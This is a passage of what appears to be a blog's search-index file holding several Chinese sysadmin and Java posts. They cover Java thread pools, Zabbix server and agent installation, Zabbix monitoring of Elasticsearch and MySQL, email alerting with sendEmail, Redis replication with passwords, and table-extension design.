Dispatch.get(paragraphs, \"Count\").getInt();// 总行数 for (int i = 1; i &lt;= paragraphCount; i++) { Dispatch paragraph = Dispatch.call(paragraphs, \"Item\", new Variant(i)).toDispatch(); Dispatch paragraphRange = Dispatch.get(paragraph, \"Range\").toDispatch(); String paragraphContent = Dispatch.get(paragraphRange, \"Text\").toString(); System.out.println(paragraphContent);//打印每行内容 Dispatch imgDispatch = Dispatch.get(paragraphRange, \"InlineShapes\").toDispatch();//图片 int imgCount = Dispatch.get(imgDispatch, \"Count\").getInt(); System.out.println(\"第\" + i +\"行图片总数\" + imgCount); for(int j=1;j&lt;imgCount+1;j++){ Dispatch shape = Dispatch.call(imgDispatch, \"Item\", new Variant(1)).toDispatch(); Dispatch imageRange = Dispatch.get(shape, \"Range\").toDispatch(); Dispatch.call(imageRange, \"Copy\"); Dispatch.call(imageRange, \"Paste\"); } } Dispatch.call(document, \"SaveAs\" , new Variant( \"D://test1.docx\")); Dispatch.call(document, \"Close\", new Variant(true)); Dispatch.call(word, \"Quit\"); long time2 = System.currentTimeMillis(); double time3 = (time2 - time1)/1000; System.out.println(time3 + \" 秒.\"); }} 问题分析用Java预研一段时间后，进展缓慢，很多非文本内容无法解析，归根结底是不知道word内部层级结构。如果能像html页面那样知道各个节点的构成，那么word解析成功按道理就只是时间问题。但是word是微软的项目，不开源，所以得去搜索下微软本身是否提供了解析word层级结构的插件。然后发现了个好东东，名为 Open XML SDK 2.0 Productivity Tool。下载安装后，把一个word文档拖进面板，就可以看见word层级结构了 ~(～￣▽￣)～ 知道层级结构就可以着手解决解析问题了，其它核心细节这里不方便透露，感兴趣的可以私聊，哈哈 ~~ 其他word中的公式处理是一个比较大的门槛，这里分享一篇不错的文章：菁优网、梯子网、猿题库的数学公式是如何实现的？","link":"/2016/09/10/word%E6%96%87%E6%A1%A3%E8%A7%A3%E6%9E%90/"},{"title":"Java线程池","text":"为什么要用线程池 减少了创建和销毁线程的次数，每个工作线程都可以被重复利用，可执行多个任务。 可以根据系统的承受能力，调整线程池中工作线线程的数目，防止因为消耗过多的内存，而把服务器累趴下(每个线程需要大约1MB内存，线程开的越多，消耗的内存也就越大，最后死机)。 Java里面线程池的顶级接口是Executor，但是严格意义上讲Executor并不是一个线程池，而只是一个执行线程的工具。真正的线程池接口是ExecutorService。 类名 说明 ExecutorService 真正的线程池接口。 ThreadPoolExecutor ExecutorService的默认实现。 ScheduledExecutorService 能和Timer/TimerTask类似，解决那些需要任务重复执行的问题。 ScheduledThreadPoolExecutor 继承ThreadPoolExecutor的ScheduledExecutorService接口实现，周期性任务调度的类实现。 常用线程池要配置一个线程池是比较复杂的，尤其是对于线程池的原理不是很清楚的情况下，很有可能配置的线程池不是较优的，因此在Executors类里面提供了一些静态工厂，生成一些常用的线程池。 newCachedThreadPool 创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。 newFixedThreadPool 创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。 newScheduledThreadPool 创建一个定长线程池，支持定时及周期性任务执行。 newSingleThreadExecutor 创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。 1、newCachedThreadPool创建一个可缓存线程池，如果线程池长度超过处理需要，可灵活回收空闲线程，若无可回收，则新建线程。示例代码如下：12345678910111213141516ExecutorService cachedThreadPool = Executors.newCachedThreadPool();for (int i = 0; i &lt; 10; i++) { final int index = i; try { Thread.sleep(index * 1000); } catch (InterruptedException e) { e.printStackTrace(); } cachedThreadPool.execute(new Runnable() { @Override public void run() { System.out.println(index); } });} 线程池为无限大，当执行第二个任务时第一个任务已经完成，会复用执行第一个任务的线程，而不用每次新建线程。 对于需要执行很多短期异步任务的程序来说，缓存线程池可以提高程序性能，因为长时间保持空闲的这种类型的线程池不会占用任何资源，调用缓存线程池对象将重用以前构造的线程（线程可用状态），若线程没有可用的，则创建一个新线程添加到池中，缓存线程池将终止并从池中移除60秒未被使用的线程。 2、newFixedThreadPool创建一个定长线程池，可控制线程最大并发数，超出的线程会在队列中等待。示例代码如下： 1234567891011121314151617ExecutorService fixedThreadPool = Executors.newFixedThreadPool(3);for (int i = 0; i &lt; 10; i++) { final int index = i; fixedThreadPool.execute(new Runnable() { @Override public void run() { try { System.out.println(index); Thread.sleep(2000); } catch (InterruptedException e) { // TODO Auto-generated catch block e.printStackTrace(); } } });} 因为线程池大小为3，每个任务输出index后sleep 2秒，所以每两秒打印3个数字。定长线程池的大小最好根据系统资源进行设置。如Runtime.getRuntime().availableProcessors()。可参考PreloadDataCache。 3、newScheduledThreadPool创建一个定长线程池，支持定时及周期性任务执行。延迟执行示例代码如下： 12345678ScheduledExecutorService scheduledThreadPool = Executors.newScheduledThreadPool(5);scheduledThreadPool.schedule(new Runnable() { @Override public void run() { System.out.println(&quot;delay 3 seconds&quot;); }}, 3, TimeUnit.SECONDS); 表示延迟3秒执行。 定期执行示例代码如下：1234567scheduledThreadPool.scheduleAtFixedRate(new Runnable() { @Override public void run() { System.out.println(&quot;delay 1 seconds, and excute every 3 seconds&quot;); }}, 1, 3, TimeUnit.SECONDS);表示延迟1秒后每3秒执行一次。ScheduledExecutorService比Timer更安全，功能更强大。参数5指的是线程池中需要保持的线程数，即便这些线程都是空闲的 4、newSingleThreadExecutor创建一个单线程化的线程池，它只会用唯一的工作线程来执行任务，保证所有任务按照指定顺序(FIFO, LIFO, 优先级)执行。示例代码如下： 1234567891011121314151617ExecutorService singleThreadExecutor = Executors.newSingleThreadExecutor();for (int i = 0; i &lt; 10; i++) { final int index = i; singleThreadExecutor.execute(new Runnable() { @Override public void run() { try { System.out.println(index); Thread.sleep(2000); } catch (InterruptedException e) { // TODO Auto-generated catch block e.printStackTrace(); } } });} 结果依次输出，相当于顺序执行各个任务。现行大多数GUI程序都是单线程的。Android中单线程可用于数据库操作，文件操作，应用批量安装，应用批量删除等不适合并发但可能IO阻塞性及影响UI线程响应的操作。","link":"/2016/06/20/java%E7%BA%BF%E7%A8%8B%E6%B1%A0/"},{"title":"zabbix agent安装详解","text":"安装Installing repository configuration packageZabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5: 1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm Zabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm Zabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm Installing Zabbix packagesExample for installing Zabbix agent only.1yum install zabbix-agent 配置文件修改查找配置文件地址，并事先做好相关备份123find / -name '*zabbix_agentd.conf*'# /etc/zabbix/zabbix_agentd.confcp /etc/zabbix/zabbix_agentd.conf /etc/zabbix/zabbix_agentd.conf.bak 修改相关具体项1234567# vim /etc/zabbix/zabbix_agentd.confEnableRemoteCommands=1 来至zabbix服务器的远程命令是否允许被执行Server=zabbix_server_IP zabbix服务器ip地址ServerActive=zabbix_server_IP 主动向zabbix server发送监控内容Hostname=name name配置的内容要和zabbix服务器配置的Host name一致UnsafeUserParameters=1 是否启用自定义key,zabbix监控mysql、tomcat等数据时需要自定义key 开机自启动12chkconfig zabbix-agent onchkconfig --list|grep zabbix-agent 启动客户端1service zabbix-agent start 服务器添加被监控主机登陆 http://zabbix_server_ip/zabbix, 点击 【组态】-&gt;【主机】-&gt;【创建主机】 配置主机名称【host name】、群组、被监控主机ip 添加监控模板并保存 回到被监控的主机列表，点击【项目】 查看刚才添加的模板所对应的监控项是否生效，绿色代表成功。 也可以在主机列表点击【图形】, 进入某个具体监控项后，再点击【预览】，查看相关监控图像。","link":"/2016/09/24/zabbix%20agent%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/"},{"title":"zabbix监控Elasticsearch集群","text":"本节以 zabbix 为例，介绍如何使用监控系统完成 Elasticsearch 的监控报警。 github 上有好几个版本的 ESZabbix 仓库，都源自 Elastic 公司员工 untergeek 最早的贡献。但是当时 Elasticsearch 还没有官方 python 客户端，所以监控程序都是用的是 pyes 库。对于最新版的 ES 来说，已经不推荐使用了。 GitHub 地址见：https://github.com/Wasim37/zabbix-es 安装配置仓库中包括三个文件：1、ESzabbix.py2、ESzabbix.userparm3、ESzabbix_templates.xml 其中，前两个文件需要分发到每个 ES 节点上。如果节点上运行的是 yum 安装的 zabbix，二者的默认位置应该分别是：12/etc/zabbix/zabbix_externalscripts/ESzabbix.py/etc/zabbix/agent_include/ESzabbix.userparm 然后在各节点安装运行 ESzabbix.py 所需的 python 库依赖： 12yum install -y python-pbr python-pip python-urllib3 python-unittest2pip install elasticsearch 安装成功后，你可以试运行下面这行命令，看看命令输出是否正常：12/etc/zabbix/zabbix_externalscripts/ESzabbix.py cluster status0 最后一个文件是 zabbix server 上的模板文件，不过在导入模板之前，还需要先创建一个数值映射，因为在模板中，设置了集群状态的触发报警，没有映射的话，报警短信只有 0, 1, 2 数字不是很易懂。 创建数值映射，在浏览器登录 zabbix-web，菜单栏的 Zabbix Administration 中选择 General 子菜单，然后在右侧下拉框中点击 Value Maping。 完成以后，即可在 Templates 页中通过 import 功能完成导入 ESzabbix_templates.xml。 在给 ES 各节点应用新模板之前，需要给每个节点定义一个 {$NODENAME} 宏，具体值为该节点 elasticsearch.yml 中的 node.name 值。从统一配管的角度，建议大家都设置为 ip 地址。 模板应用导入完成后，zabbix 里多出来三个可用模板： Elasticsearch Node Cache 其中包括两个 Application：ES Cache 和 ES Node。分别有 Node Field Cache Size, Node Filter Cache Size 和 Node Storage Size, Records indexed per second 共计 4 个 item 监控项。在完成上面说的宏定义后，就可以把这个模板应用到各节点(即监控主机)上了。 Elasticsearch Service 只有一个监控项 Elasticsearch service status，做进程监控的，也应用到各节点上。 Elasticsearch Cluster 包括 11 个监控项，如下列所示。其中，ElasticSearch Cluster Status 这个监控项连带有报警的触发器，并对应之前创建的那个 Value Map。Cluster-wide records indexed per secondCluster-wide storage sizeElasticSearch Cluster StatusNumber of active primary shardsNumber of active shardsNumber of data nodesNumber of initializing shardsNumber of nodesNumber of relocating shardsNumber of unassigned shardsTotal number of records Elasticsearch Cluster模板下都是集群总体情况的监控项，所以，运用在一台有 ES 集群读取权限的主机上即可，比如 zabbix server。 zabbix监控成功后，可以在grafana上进行相关配置，展示图像。下面是我初步搭建的界面： 其他untergeek 最近刚更新了他的仓库，重构了一个 es_stats_zabbix 模块用于 Zabbix 监控，有兴趣的读者可以参考：https://github.com/untergeek/zabbix-grab-bag/blob/master/Elasticsearch/es_stats_zabbix.README.md","link":"/2017/01/05/zabbix%E7%9B%91%E6%8E%A7Elasticsearch%E9%9B%86%E7%BE%A4/"},{"title":"Redis多实例及主从搭建","text":"前提是服务器上已经安装好了redis,redis安装可搜索本站另一篇博客：redis安装。 redis单主机多实例一、我们首先拷贝两份文件： 12cp /etc/redis.conf /etc/redis6381.confcp /etc/redis.conf /etc/redis6382.conf 二、修改redis6381配置文件123456789101112131415161718192021222324# vim /etc/redis6381.conf# 默认情况下 redis 不是作为守护进程运行的，如果你想让它在后台运行，你就把它改成 yes。daemonize yes# 当redis作为守护进程运行的时候，它会把 pid 默认写到 /var/run/redis.pid 文件里面，# 但是你可以在这里自己制定它的文件位置。pidfile /var/run/redis/redis_6381.pid# 监听端口号，默认为 6379，如果你设为 0 ，redis 将不在 socket 上监听任何客户端连接。port 6381# 指定日志文件的位置，不同的实例设置不同的日志文件，便于问题定位logfile /var/log/redis/redis_6381.log# 设置dump的文件名称，不同的实例设置不同的db文件，便于问题定位dbfilename dump_6381.rdb # 工作目录# 例如上面的 dbfilename 只指定了文件名，但是它会写入到这个目录下。# 这个配置项一定是个目录，而不能是文件名。# 这个配置项默认值为“./”，最好改相对路径为绝对路径# 如果为相对路径，redis在哪里启动，dump.rdb文件就会产生在启动的目录，这也就是有些人重启redis后key值消失的原因dir /data/redisdb/ 相关命令12345#启动6381端口服务src/redis-server /etc/redis6381.conf#按端口进入客户端/usr/bin/redis-cli -p 6381 三、同理我们配置6382配置文件, 成功启动服务后，查看进程： redis主从配置修改6381、6382从库配置：12vim /etc/redis/redis6381.confvim /etc/redis/redis6382.conf 重启6379、6381、6382服务，可以看到主从数据实现同步 用客户端登录相关主从服务器，输入info查看主从配置信息1234567891011121314151617181920212223242526272829303132#主机127.0.0.1:6379&gt;info# Replicationrole:masterconnected_slaves:1slave0:ip=从机ip,port=6379,state=online,offset=140933,lag=1master_repl_offset:140933repl_backlog_active:1repl_backlog_size:1048576repl_backlog_first_byte_offset:2repl_backlog_histlen:140932#从机127.0.0.1:6381&gt;info# Replicationrole:slavemaster_host:主机ipmaster_port:6379master_link_status:upmaster_last_io_seconds_ago:7master_sync_in_progress:0slave_repl_offset:141073slave_priority:100slave_read_only:1connected_slaves:0master_repl_offset:0repl_backlog_active:0repl_backlog_size:1048576repl_backlog_first_byte_offset:0repl_backlog_histlen:0 redis添加密码正式环境redis的使用，密码的配置必不可少。redis密码缺失的情况下，攻击者很容易通过肉机扫描redis默认端口，免密登录redis进而通过config命令修改服务器配置文件，造成破坏。 修改6379主库配置：1234vim /etc/redis/redis6379.conf# 修改requirepass项requirepass master-password修改6381、6382从库配置：12345678vim /etc/redis/redis6381.confvim /etc/redis/redis6382.conf# 修改requirepass项requirepass slave-password# 修改masterauth项masterauth &lt;master-password&gt; 重启服务，按端口按密码进入客户端测试相关效果即可1/usr/bin/redis-cli -p 6382 -a password","link":"/2016/09/18/redis%E5%A4%9A%E5%AE%9E%E4%BE%8B%E5%8F%8A%E4%B8%BB%E4%BB%8E%E6%90%AD%E5%BB%BA/"},{"title":"zabbix监控mysql","text":"zabbix自带mysql监控模板，可监控mysql的增删改查、请求流量带宽和响应流量带宽等。 监控步骤1、服务器上安装zabbix agent客户端，并修改zabbix_agentd.conf文件1234567# vim /etc/zabbix/zabbix_agentd.confEnableRemoteCommands=1 来至zabbix服务器的远程命令是否允许被执行Server=zabbix_server_IP zabbix服务器ip地址ServerActive=zabbix_server_IP 主动向zabbix server发送监控内容Hostname=name name配置的内容要和zabbix服务器配置的Host name一致UnsafeUserParameters=1 是否启用自定义key,zabbix监控mysql、tomcat等数据时需要自定义key 2、编写check_mysql.sh脚本, 存放路径：/etc/zabbix/scripts。并赋予脚本执行权限【chmod +x check_mysql.sh】。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# 用户名MYSQL_USER=''# 密码MYSQL_PWD=''# 主机地址/IPMYSQL_HOST=''# 端口MYSQL_PORT=''# 数据连接MYSQL_CONN=\"/usr/bin/mysqladmin -u${MYSQL_USER} -p${MYSQL_PWD} -h${MYSQL_HOST} -P${MYSQL_PORT}\" # 参数是否正确if [ $# -ne \"1\" ];then echo \"arg error!\" fi # 获取数据case $1 in Uptime) result=`${MYSQL_CONN} status|cut -f2 -d\":\"|cut -f1 -d\"T\"` echo $result ;; Com_update) result=`${MYSQL_CONN} extended-status |grep -w \"Com_update\"|cut -d\"|\" -f3` echo $result ;; Slow_queries) result=`${MYSQL_CONN} status |cut -f5 -d\":\"|cut -f1 -d\"O\"` echo $result ;; Com_select) result=`${MYSQL_CONN} extended-status |grep -w \"Com_select\"|cut -d\"|\" -f3` echo $result ;; Com_rollback) result=`${MYSQL_CONN} extended-status |grep -w \"Com_rollback\"|cut -d\"|\" -f3` echo $result ;; Questions) result=`${MYSQL_CONN} status|cut -f4 -d\":\"|cut -f1 -d\"S\"` echo $result ;; Com_insert) result=`${MYSQL_CONN} extended-status |grep -w \"Com_insert\"|cut -d\"|\" -f3` echo $result ;; Com_delete) result=`${MYSQL_CONN} extended-status |grep -w \"Com_delete\"|cut -d\"|\" -f3` echo $result ;; Com_commit) result=`${MYSQL_CONN} extended-status |grep -w \"Com_commit\"|cut -d\"|\" -f3` echo $result ;; Bytes_sent) result=`${MYSQL_CONN} extended-status |grep -w \"Bytes_sent\" |cut -d\"|\" -f3` echo $result ;; Bytes_received) result=`${MYSQL_CONN} extended-status |grep -w \"Bytes_received\" |cut -d\"|\" -f3` echo $result ;; Com_begin) result=`${MYSQL_CONN} extended-status |grep -w \"Com_begin\"|cut -d\"|\" -f3` echo $result ;; *) echo \"Usage:$0(Uptime|Com_update|Slow_queries|Com_select|Com_rollback|Questions|Com_insert|Com_delete|Com_commit|Bytes_sent|Bytes_received|Com_begin)\" ;; esac 3、修改/etc/zabbix/zabbix_agentd.d下的userparameter_mysql.conf文件，没有就自行创建。注释掉原有key，在最后一行新增如下数据：123UserParameter=mysql.version,mysql -VUserParameter=mysql.ping,HOME=/var/lib/zabbix mysql ping | grep -c aliveUserParameter=mysql.status[*],/etc/zabbix/scripts/check_mysql.sh $1 4、重启zabbix客户端1service zabbix-agent restart 5、在zabbix服务器上添加监控主机和mysql模板，然后点击【图形】-&gt;【预览】，查看相关监控图像。 6、安装grafana-zabbix插件，通过grafana监控相关数据。 问题排查如果发现监控没有数据，请排查如下问题： abbix客户端是否重启 脚本是否有执行权限 数据库是否有权限 环境变量是否有问题 zabbix item列是否显示红叉【鼠标移至图标，有错误提示】 具体错误，可以查看zabbix agent打印的日志。默认地址为：LogFile=/var/log/zabbix/zabbix_agentd.log，可在zabbix_agentd.conf中修改。 此处需要注意的是，根据错误提示修改了配置，并重启了zabbix客户端，zabbix 服务器的item错误提示并不会马上消失，监控页面也不会马上产生数据，因此不要立马判断你的修改无效，有效方法是先查看是否有错误日志打印。 错误相关 如果日志提示错误【/bin/sh^M: bad interpreter: No such file or directory】，那是shell脚本编码格式错误导致的，vim进入脚本文件，敲命令【:set ff=unix】，保存退出即可。 如果日志提示警告【mysqladmin: [Warning] Using a password on the command line interface can be insecure.】，那么需要额外定义一个.my.cnf文件，然后check_mysql.sh的用户名密码等从.my.cnf读取。 如果zabbix服务器item项总是提示【Not supported by Zabbix Agent】，不是配置问题就是版本问题，可以在zabbix server上执行zabbix_get命令来试着获取item值。 12345yum list all |grep zabbix-getyum install zabbix-get.x86_64/usr/bin/zabbix_get -s 127.0.0.1 -p 10050 -k \"system.cpu.load[all,avg15]\"0.270000 其他zabbix可以自定义监控模板，用来监控mysql、tomcat和nginx等。监控模板网上可以搜索到，然后点击【组态】-&gt;【模板】-&gt;【汇入】即可。由于汇入的模板默认会覆盖原有配置，所以记得事先点击模板列表左下角的【汇出】进行相关模板备份。","link":"/2016/09/29/zabbix%E7%9B%91%E6%8E%A7mysql/"},{"title":"zabbix邮件报警","text":"示警媒介一般情况下，zabbix监控主机都配置了触发器，触发器被触发发送消息给运维，需要中间介质来接收并传递消息。 zabbix默认的【示警媒介类型】有三种，Email、Jabber、SMS。（1）Email：使用sendmail发送邮件，从这边出去的邮件基本是垃圾邮件。（2）SMS：需要短信设备，没有，所以没用过这东西（3）Jabber:Jabber有第三方插件，能让Jabber用户和MSN、YahooMessager、ICQ等IM用户相互通讯。因为Google遵从Jabber协议，并且Google已经将Gtalk的服务器开放给了其它的Jabber服务器。所以PSI、Giam等Jabber客户端软件支持GTalk用户登陆。国内没啥人用。 sendEmail是一个轻量级，命令行的SMTP邮件客户端。如果需要使用命令行发送邮件，那么sendEmail是不错的选择。sendEmail使用简单并且功能强大。这个被设计用在php、perl和web站点使用。请注意，不是sendmail。 sendEmail安装12345678910111213# 下载软件wget http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz# 解压软件# tar zxvf sendEmail-v1.56.tar.gz# 进入目录cd /usr/src/sendEmail-v1.56# 创建目录mkdir /usr/local/bin# 复制文件，并设置权限cp -a sendEmail /usr/local/binchmod +x /usr/local/bin/sendEmail# 安装组件yum install perl-Net-SSLeay perl-IO-Socket-SSL -y zabbix server端配置进入zabbix自定义的指定目录可以查看zabbix_server.conf配置文件AlertScriptsPath变量是如何定义的。 进入相关目录cd /usr/lib/zabbix/alertscripts 新建sendEmail.sh脚本，内容如下123456#!/bin/bashto=$1subject=$2body=$3/usr/local/bin/sendEmail -f a@domain.com -t \"$to\" -s smtp.exmail.qq.com -u \"$subject\" -o message-content-type=html -o message-charset=utf8 -xu a@domain.com -xp password -m \"$body\" a@domain.com 表示发件人邮箱smtp.exmail.qq.com 表示邮箱的smtp服务器，这里用的是腾讯邮箱。password 表示发件人邮箱密码 编辑完成后，给脚本权限12chmod +x sendEmail.shchown zabbix.zabbix sendEmail.sh手动执行一次脚本，后面的参数分别对应接收人，主题，内容1./sendEmail.sh c@domain.com test 123登录c@domain.com的账户，查看邮件是否可以收到如果脚本执行没有报错，收不到邮件的话，请检查linux网络问题,iptables、selinux是否关闭。 zabbix web端配置进入zabbix管理页面点击管理-&gt;报警媒介类型 点击最右边的创建媒体类型 输入脚本名称，类型选择脚本添加以下3个参数，分别对应sendEmail.sh脚本需要的3个参数：收件人地址、主题、详细内容{ALERT.SENDTO}{ALERT.SUBJECT}{ALERT.MESSAGE} 解释:很多人安装zabbix 3.0之后，写的脚本一直发信不成功,手动执行时可以的。那是因为zabbix3.0之后，可以自定义参数了。所以不写参数，它是不会传参数的。在2.x版本不存在这个问题，默认会传3个参数。 点击Admin用户 点击添加 选择sendEmail.sh脚本，输入收件人的邮箱地址 点击用户群组，点击zabbix administrator后面的调用模式，点击一下，就启用了 点权限-&gt;添加 选择所有 点击更新 点击配置-&gt;动作 点击默认的动作 点击操作-&gt;编辑 修改持续时间为60秒修改步骤为3,表示触发3次动作选择用户Admin选择仅送到sendEmail.sh点击更新 点击更新 解释:默认的步骤是1-1,也即是从1开始到1结束。一旦故障发生，就是执行sendEmail.sh脚本发生报警邮件给Admin用户和zabbix administrator组。假如故障持续了1个小时，它也只发送一次。如果改成1-0，0是表示不限制.无限发送间隔就是默认持续时间60秒。那么一个小时，就会发送60封邮件。如果需要短信报警的话,可以再创建一条新的动作，选择短信脚本。 邮件测试及模板修改下面开始测试邮件报警先添加一台主机test，不存在的IP地址等待几分钟，可以看到是红色状态 等待几分钟，就会收到邮件报警了 点击报表-&gt;动作日志 可以看到触发动作的次数。只会有3次，除非test主机状态改变，也就是正常的时候，会触发一次,否则不会再触发。 大家可以看到邮件里面内容都堆到一起了，没有换行，且是英文，可以自行修改【组态-动作-动作】里的配置。 下面是我修改后的配置信息:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051====================================================# 默认接收人:故障{TRIGGER.STATUS}，服务器【{HOST.NAME1}】发生【 {TRIGGER.NAME}】故障！====================================================# 默认信息:告警主机:{HOST.NAME1}&lt;br/&gt;告警时间:{EVENT.DATE} {EVENT.TIME}&lt;br/&gt;告警等级:{TRIGGER.SEVERITY}&lt;br/&gt;告警信息: {TRIGGER.NAME}&lt;br/&gt;告警项目:{TRIGGER.KEY1}&lt;br/&gt;问题详情:{ITEM.NAME}:{ITEM.VALUE}&lt;br/&gt;当前状态:{TRIGGER.STATUS}:{ITEM.VALUE1}&lt;br/&gt;事件ID:{EVENT.ID}&lt;br/&gt;====================================================# 恢复主旨:恢复{TRIGGER.STATUS}，服务器【{HOST.NAME1}】故障【 {TRIGGER.NAME}】已恢复！====================================================# 恢复信息:告警主机:{HOST.NAME1}&lt;br/&gt;告警时间:{EVENT.DATE} {EVENT.TIME}&lt;br/&gt;告警等级:{TRIGGER.SEVERITY}&lt;br/&gt;告警信息: {TRIGGER.NAME}&lt;br/&gt;告警项目:{TRIGGER.KEY1}&lt;br/&gt;问题详情:{ITEM.NAME}:{ITEM.VALUE}&lt;br/&gt;当前状态:{TRIGGER.STATUS}:{ITEM.VALUE1}&lt;br/&gt;事件ID:{EVENT.ID}&lt;br/&gt; 更改后，收到的邮件样式如下：","link":"/2016/11/01/zabbix%E9%82%AE%E4%BB%B6%E6%8A%A5%E8%AD%A6/"},{"title":"zabbix server安装详解","text":"简介zabbix（音同 zæbix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。 zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。 安装Installing repository configuration packageZabbix 2.2 for RHEL5, Oracle Linux 5, CentOS 5: 1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/5/x86_64/zabbix-release-2.2-1.el5.noarch.rpm Zabbix 2.2 for RHEL6, Oracle Linux 6, CentOS 6:1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/6/x86_64/zabbix-release-2.2-1.el6.noarch.rpm Zabbix 2.2 for RHEL7, Oracle Linux 7, CentOS 7:1rpm -ivh http://repo.zabbix.com/zabbix/2.2/rhel/7/x86_64/zabbix-release-2.2-1.el7.noarch.rpm Installing Zabbix packagesInstall Zabbix packages. Example for Zabbix server and web frontend with mysql database. 1yum install zabbix-server-mysql zabbix-web-mysql Example for installing Zabbix agent only.1yum install zabbix-agent zabbix-agent需要安装在被监控的机器上，详见另一篇文档《zabbix agent安装详解》 Creating initial databaseCreate zabbix database and user on MySQL. 1234# mysql -urootmysql&gt; create database zabbix character set utf8 collate utf8_bin;mysql&gt; grant all privileges on zabbix.* to zabbix@localhost identified by 'zabbix';mysql&gt; exit Import initial schema and data.1234cd /usr/share/doc/zabbix-server-mysql-2.2.0/createmysql -uroot zabbix &lt; schema.sqlmysql -uroot zabbix &lt; images.sqlmysql -uroot zabbix &lt; data.sql Starting Zabbix server processEdit database configuration in zabbix_server.conf12345# vi /etc/zabbix/zabbix_server.confDBHost=localhostDBName=zabbixDBUser=zabbixDBPassword=zabbix Start Zabbix server process.1service zabbix-server start Editing PHP configuration for Zabbix frontendApache configuration file for Zabbix frontend is located in /etc/httpd/conf.d/zabbix.conf. Some PHP settings are already configured. 123456php_value max_execution_time 300php_value memory_limit 128Mphp_value post_max_size 16Mphp_value upload_max_filesize 2Mphp_value max_input_time 300# php_value date.timezone Europe/Riga It’s necessary to uncomment the “date.timezone” setting and set the right timezone for you. After changing the configuration file restart the apache web server. 如上所述，此处时区配置项需要修改，可改为 php_value date.timezone Asia/Shanghai 1service httpd restart Zabbix frontend is available at http://zabbix-frontend-hostname/zabbix in the browser.Default username/password is Admin/zabbix. 123# 设置自启动chkconfig httpd onchkconfig --list|grep httpd 中文设置及中文乱码中文设置【登陆】-&gt;【profile】-&gt;【User】，language改为chinese[zh_CN]. 中文乱码由于zabbix的web前端默认没有中文字库，因此zabbix图形化显示时下面的中文都是方框。解决方法就是拷贝中文字体到zabbix前端。 1.进入c:\\Windows\\Fonts，选择其中任意一种中文字库例如楷体文件simkai.ttf，将其拷贝至zabbix的web 前端页面字体/usr/share/zabbix/fonts 下12[root@iZ94ekimlddZ fonts]# lsgraphfont.ttf simkai.ttf 2.修改zabbix的web前端 defines.inc.php1234567891011# vim /usr/share/zabbix/include/defines.inc.php找到define('ZBX_FONT_NAME', 'DejaVuSans');define('ZBX_GRAPH_FONT_NAME', 'DejaVuSans'); 这2行修改为define('ZBX_FONT_NAME', 'SIMKAI');define('ZBX_GRAPH_FONT_NAME', 'SIMKAI'); 保存退出 其他Zabbix官网安装教程(翻墙)：https://www.zabbix.com/documentation/2.2/manual/installation/install_from_packages#red_hat_enterprise_linux_centos zabbix中文操作手册：http://pan.baidu.com/s/1i46GoQh 密码：xw5n (手册中有相关shell脚本下载地址) zabbix_agentd.conf配置文件详解http://www.ttlsa.com/zabbix/zabbix_agentd-conf-description/ zabbix_server.conf配置文件详解http://www.ttlsa.com/zabbix/zabbix_server-conf-detail/ grafana-zabbix插件安装：在grafana插件中心安装grafana-zabbix插件后，需要配置相关数据源：http://blog.csdn.net/zk673820543/article/details/50617412 grafana-zabbix使用教程【内含gif图】：https://github.com/alexanderzobnin/grafana-zabbix/wiki/Usage","link":"/2016/09/23/zabbix%20server%E5%AE%89%E8%A3%85%E8%AF%A6%E8%A7%A3/"},{"title":"从表扩展增加列属性说起","text":"需求背景产品第一版，用户有用户名、密码、昵称等三个属性，对应表设计：user(uid, name, passwd, nick)产品第二版，产品经理增加了年龄，性别两个属性，表结构可能要变成：user(uid, name, passwd, nick, age, sex) 讨论问题域1）数据量大、并发量高场景，在线数据库属性扩展2）数据库表结构扩展性设计 哪些方案一定不行1、alter table add column要坚持这个方案的，也不多解释了，大数据高并发情况下，一定不可行 2、通过增加表的方式扩展，通过外键join来查询大数据高并发情况下，join性能较差，一定不可行 3、通过增加表的方式扩展，通过视图来对外一定不可行。大数据高并发情况下，互联网不怎么使用视图 4、必须遵循“第x范式”的方案一定不可行。互联网的主要矛盾之一是吞吐量，为了保证吞吐量甚至可能牺牲一些事务性和一致性，通过反范式的方式来确保吞吐量的设计是很常见的，例如：冗余数据。互联网的主要矛盾之二是可用性，为了保证可用性，常见的技术方案也是数据冗余。在互联网数据库架构设计中，第x范式真的没有这么重要 5、打产品经理没试过… 哪些方案可行1、提前预留一些reserved字段方案可行，但如果预留过多，会造成空间浪费，预留过少，不一定达得到扩展效果。 2、通过增加表的方式扩展列，上游通过service来屏蔽底层的细节方案可行，比如新增表UserExt(uid, newCol1, newCol2)（但join连表和视图是不行的）。 3、版本号+通用列以上面的用户表为例，假设只有uid和name上有查询需求，表可以设计为user(uid, name, version, ext)（1）uid和name有查询需求，必须设计为单独的列并建立索引（2）version是版本号字段，它对ext进行了版本解释（3）ext采用可扩展的字符串协议载体，承载被查询的属性 例如，最开始上线的时候，版本为0，此时只有passwd和nick两个属性，那么数据为： 